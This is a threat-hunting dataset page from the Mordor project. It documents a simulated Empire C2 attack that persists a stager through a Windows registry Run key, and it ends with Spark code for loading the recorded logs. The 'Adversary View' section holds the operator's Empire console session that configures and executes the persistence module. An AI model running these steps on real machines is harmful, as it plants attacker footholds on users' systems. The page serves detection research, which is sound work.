# Empire Userland Registry

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-190319023812 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/03/19 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1 |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_userland_registry.tar.gz |

## Dataset Description
This dataset represents adversaries modifying HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry keys for persistence.

## Adversary View
```
usemodule persistence/userland/registry
(Empire: powershell/persistence/userland/registry) > info

              Name: Invoke-Registry
            Module: powershell/persistence/userland/registry
        NeedsAdmin: False
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @mattifestation
  @harmj0y
  @enigma0x3

Description:
  Persist a stager (or script) via the
  HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry
  key. This has an easy detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  ProxyCreds False       default                   Proxy credentials                       
                                                  ([domain\]username:password) to use for 
                                                  request (default, none, or other).      
  EventLogID False                                 Store the script in the Application     
                                                  event log under the specified EventID.  
                                                  The ID needs to be unique/rare!         
  ExtFile    False                                 Use an external file for the payload    
                                                  instead of a stager.                    
  Cleanup    False                                 Switch. Cleanup the trigger and any     
                                                  script from specified location.         
  ADSPath    False                                 Alternate-data-stream location to store 
                                                  the script code.                        
  Agent      True        FD6A3MGY                  Agent to run module on.                 
  Listener   True                                  Listener to use.                        
  KeyName    True        Updater                   Key name for the run trigger.           
  RegPath    False       HKCU:Software\Microsoft\  Registry location to store the script   
                        Windows\CurrentVersion\D  code. Last element is the key name.     
                        ebug                    
  Proxy      False       default                   Proxy to use for request (default, none,
                                                  or other).                              
  UserAgent  False       default                   User-agent string to use for the staging
                                                  request (default, none, or other).      

(Empire: powershell/persistence/userland/registry) > set Listener https
(Empire: powershell/persistence/userland/registry) > info

              Name: Invoke-Registry
            Module: powershell/persistence/userland/registry
        NeedsAdmin: False
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @mattifestation
  @harmj0y
  @enigma0x3

Description:
  Persist a stager (or script) via the
  HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry
  key. This has an easy detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  ProxyCreds False       default                   Proxy credentials                       
                                                  ([domain\]username:password) to use for 
                                                  request (default, none, or other).      
  EventLogID False                                 Store the script in the Application     
                                                  event log under the specified EventID.  
                                                  The ID needs to be unique/rare!         
  ExtFile    False                                 Use an external file for the payload    
                                                  instead of a stager.                    
  Cleanup    False                                 Switch. Cleanup the trigger and any     
                                                  script from specified location.         
  ADSPath    False                                 Alternate-data-stream location to store 
                                                  the script code.                        
  Agent      True        FD6A3MGY                  Agent to run module on.                 
  Listener   True        https                     Listener to use.                        
  KeyName    True        Updater                   Key name for the run trigger.           
  RegPath    False       HKCU:Software\Microsoft\  Registry location to store the script   
                        Windows\CurrentVersion\D  code. Last element is the key name.     
                        ebug                    
  Proxy      False       default                   Proxy to use for request (default, none,
                                                  or other).                              
  UserAgent  False       default                   User-agent string to use for the staging
                                                  request (default, none, or other).      

(Empire: powershell/persistence/userland/registry) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked FD6A3MGY to run TASK_CMD_WAIT
[*] Agent FD6A3MGY tasked with task ID 9
[*] Tasked agent FD6A3MGY to run module powershell/persistence/userland/registry
(Empire: powershell/persistence/userland/registry) > Registry persistence established using listener https stored in HKCU:Software\Microsoft\Windows\CurrentVersion\Debug.

(Empire: powershell/persistence/userland/registry) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_userland_registry.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        